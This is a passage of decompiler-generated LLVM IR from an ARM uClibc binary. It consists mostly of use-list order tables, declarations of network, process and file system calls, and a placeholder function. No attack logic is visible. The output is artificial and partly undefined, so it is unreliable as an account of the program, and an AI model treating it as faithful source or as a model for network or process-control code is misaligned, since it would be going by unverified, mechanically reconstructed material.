  uselistorder i32 0, { 0, 1196, 94, 1197, 1198, 222, 221, 539, 82, 83, 84, 85, 541, 540, 63, 62, 95, 1199, 1200, 1201, 1202, 1204, 1203, 1, 1205, 1206, 224, 223, 542, 86, 87, 88, 89, 544, 543, 65, 64, 61, 71, 1207, 545, 2, 1208, 1209, 90, 1210, 1211, 1212, 1213, 1214, 123, 546, 549, 547, 548, 1215, 550, 103, 124, 888, 889, 91, 890, 891, 892, 3, 569, 225, 5, 4, 125, 893, 126, 570, 6, 226, 127, 128, 263, 66, 129, 7, 9, 8, 272, 81, 663, 664, 895, 894, 896, 897, 33, 130, 898, 133, 132, 131, 264, 265, 266, 135, 134, 136, 273, 899, 900, 137, 874, 875, 104, 138, 901, 139, 592, 140, 902, 903, 141, 904, 905, 595, 816, 96, 817, 818, 596, 597, 593, 571, 280, 594, 616, 617, 598, 599, 142, 143, 600, 601, 602, 603, 572, 278, 604, 605, 573, 279, 606, 607, 574, 277, 608, 609, 575, 276, 610, 611, 576, 275, 612, 619, 577, 274, 613, 618, 614, 78, 67, 105, 106, 615, 551, 819, 281, 820, 228, 821, 282, 822, 825, 826, 145, 227, 823, 824, 283, 284, 827, 828, 829, 830, 578, 74, 285, 832, 833, 834, 835, 836, 837, 838, 839, 286, 840, 92, 841, 107, 842, 568, 843, 844, 845, 567, 846, 847, 848, 144, 287, 288, 849, 852, 853, 854, 855, 856, 146, 850, 147, 851, 10, 148, 831, 635, 636, 637, 80, 68, 638, 79, 69, 639, 640, 641, 642, 643, 644, 289, 290, 645, 646, 648, 149, 647, 75, 649, 11, 674, 675, 678, 679, 676, 677, 680, 681, 620, 291, 621, 622, 150, 623, 624, 625, 626, 627, 628, 629, 630, 151, 76, 292, 631, 294, 295, 12, 632, 633, 152, 634, 59, 60, 296, 297, 293, 650, 651, 652, 298, 267, 156, 155, 579, 268, 158, 157, 580, 269, 160, 159, 581, 270, 162, 161, 582, 583, 271, 154, 153, 229, 234, 230, 231, 232, 299, 653, 163, 164, 654, 655, 656, 657, 658, 659, 660, 661, 662, 165, 166, 300, 665, 666, 667, 668, 669, 99, 670, 672, 671, 97, 98, 167, 233, 302, 303, 301, 673, 236, 237, 238, 100, 168, 72, 169, 682, 111, 110, 108, 109, 683, 684, 73, 685, 686, 687, 688, 689, 170, 690, 691, 304, 692, 693, 694, 695, 174, 171, 172, 173, 696, 697, 698, 699, 305, 700, 701, 241, 702, 240, 703, 239, 704, 306, 705, 706, 707, 114, 112, 113, 13, 708, 709, 710, 711, 175, 712, 713, 307, 242, 714, 308, 715, 716, 717, 718, 719, 118, 115, 116, 117, 14, 720, 721, 722, 176, 723, 177, 724, 725, 245, 726, 244, 727, 243, 728, 309, 729, 182, 311, 180, 181, 178, 179, 730, 184, 183, 185, 310, 732, 733, 122, 119, 120, 121, 15, 731, 734, 735, 736, 737, 738, 739, 18, 19, 20, 21, 22, 740, 741, 313, 312, 742, 314, 743, 315, 744, 316, 745, 317, 746, 318, 747, 319, 748, 246, 749, 186, 187, 188, 751, 752, 750, 754, 755, 753, 23, 24, 25, 26, 27, 756, 189, 757, 758, 248, 759, 320, 760, 321, 761, 322, 762, 323, 763, 324, 764, 325, 765, 247, 766, 326, 767, 191, 190, 192, 769, 770, 768, 771, 772, 70, 774, 775, 776, 777, 327, 778, 28, 29, 30, 31, 32, 773, 193, 101, 779, 780, 253, 781, 252, 782, 251, 783, 249, 784, 250, 785, 328, 786, 329, 787, 194, 197, 196, 195, 790, 791, 789, 788, 330, 793, 792, 794, 198, 795, 796, 256, 797, 255, 798, 254, 799, 331, 800, 199, 202, 201, 200, 803, 804, 802, 801, 806, 805, 807, 808, 203, 259, 809, 258, 810, 257, 811, 332, 812, 813, 906, 204, 907, 814, 205, 815, 857, 858, 859, 860, 861, 862, 206, 863, 864, 865, 866, 867, 868, 869, 870, 207, 208, 871, 872, 873, 876, 209, 877, 878, 210, 333, 879, 880, 34, 881, 882, 883, 884, 885, 334, 886, 211, 908, 909, 910, 887, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 335, 924, 552, 553, 554, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 35, 966, 967, 968, 212, 213, 969, 336, 970, 971, 972, 973, 555, 584, 974, 975, 976, 36, 977, 978, 979, 980, 37, 981, 982, 983, 984, 985, 986, 987, 38, 988, 989, 218, 990, 991, 992, 993, 994, 995, 39, 996, 997, 998, 40, 999, 1000, 1001, 41, 1002, 1003, 1004, 1005, 339, 1019, 1020, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 556, 585, 1015, 1016, 1017, 1018, 557, 586, 1021, 1022, 1023, 42, 1024, 1025, 340, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 558, 587, 1034, 1035, 1036, 43, 1037, 1038, 1039, 1040, 44, 1041, 559, 1042, 1043, 1046, 1047, 560, 214, 1044, 1045, 215, 216, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 561, 588, 1059, 1060, 1061, 45, 1062, 1063, 1064, 1065, 1066, 1067, 46, 1068, 102, 1069, 1070, 1071, 1072, 562, 589, 1073, 1074, 1075, 47, 1076, 217, 1077, 1078, 1079, 48, 1080, 1081, 1082, 1083, 1084, 563, 590, 1085, 1086, 1087, 49, 1088, 1089, 1090, 50, 337, 338, 1091, 1092, 1093, 1094, 1095, 564, 591, 1096, 1097, 1098, 51, 1099, 1100, 1101, 52, 1102, 1103, 1104, 53, 1105, 1106, 1107, 54, 1108, 1109, 1110, 1111, 55, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1124, 1125, 565, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 235, 1137, 1140, 1141, 1144, 1145, 1146, 56, 1142, 1143, 1138, 1139, 1147, 1148, 219, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 57, 220, 1159, 1160, 1161, 58, 1162, 1163, 1164, 1165, 1167, 77, 341, 1168, 1166, 1122, 1123, 93, 1169, 566, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 260, 1190, 261, 1191, 262, 1192, 1195, 1193, 1194, 16, 17, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228 }
  uselistorder i32* @r4, { 29, 468, 373, 374, 95, 96, 30, 375, 376, 377, 378, 379, 380, 31, 32, 323, 324, 33, 325, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 326, 327, 328, 329, 330, 331, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 346, 0, 347, 332, 333, 58, 59, 60, 61, 62, 301, 302, 303, 304, 111, 112, 344, 345, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 63, 64, 65, 66, 67, 68, 69, 2, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 98, 99, 1, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 3, 159, 4, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 5, 182, 6, 183, 7, 184, 8, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 9, 205, 10, 206, 11, 207, 12, 208, 209, 210, 13, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 14, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 15, 286, 16, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 305, 17, 306, 18, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 381, 382, 383, 348, 349, 350, 351, 352, 353, 19, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 366, 364, 365, 367, 368, 369, 370, 371, 372, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 23, 411, 412, 28, 413, 21, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 27, 20, 425, 426, 427, 428, 429, 430, 431, 26, 432, 433, 434, 25, 435, 436, 437, 24, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 469 }
}

declare i32 @getpid() local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32* @memcpy(i32*, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32* @malloc(i32) local_unnamed_addr

declare i32 @sleep(i32) local_unnamed_addr

declare i32 @recvfrom(i32, i32*, i32, i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @select(i32, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %_TYPEDEF_fd_set*, %timeval*) local_unnamed_addr

declare %dirent* @readdir(%__dirstream*) local_unnamed_addr

declare i32 @sigaddset(%_TYPEDEF_sigset_t*, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare void @abort() local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32* @calloc(i32, i32) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @inet_addr(i8*) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32* @realloc(i32*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @__uClibc_main() local_unnamed_addr

declare i32* @memset(i32*, i32, i32) local_unnamed_addr

declare i32 @getppid() local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare %__dirstream* @opendir(i8*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32* @__errno_location() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @atoi(i8*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @clock() local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @closedir(%__dirstream*) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @raise(i32) local_unnamed_addr

declare void @free(i32*) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

define i32 @__data_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1cc98 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1cc98, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder i1 false, { 0, 2, 38, 3, 37, 1, 10, 12, 4, 5, 6, 36, 67, 68, 69, 9, 7, 8, 33, 63, 70, 41, 71, 72, 42, 73, 17, 18, 19, 20, 43, 74, 75, 59, 76, 77, 78, 48, 79, 22, 23, 49, 80, 50, 81, 44, 45, 46, 21, 82, 47, 83, 84, 58, 85, 86, 87, 88, 89, 90, 51, 52, 91, 92, 53, 93, 54, 55, 94, 56, 95, 57, 96, 39, 40, 97, 98, 99, 100, 101, 102, 24, 25, 60, 103, 104, 61, 31, 105, 62, 14, 15, 26, 16, 27, 28, 29, 11, 30, 106, 32, 34, 64, 65, 107, 13, 66, 108, 35, 109 }
  uselistorder i1* @cpsr_z, { 8, 4, 5, 0, 1, 2, 3, 6, 7 }
  uselistorder label %bb1, { 1, 0 }
}

declare i32 @unknown_e28cca13() local_unnamed_addr

declare i32 @unknown_e5bcfff8() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare %timeval* @__decompiler_undefined_function_3() local_unnamed_addr

declare %sockaddr* @__decompiler_undefined_function_4() local_unnamed_addr

declare void (i32)* @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_fd_set* @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
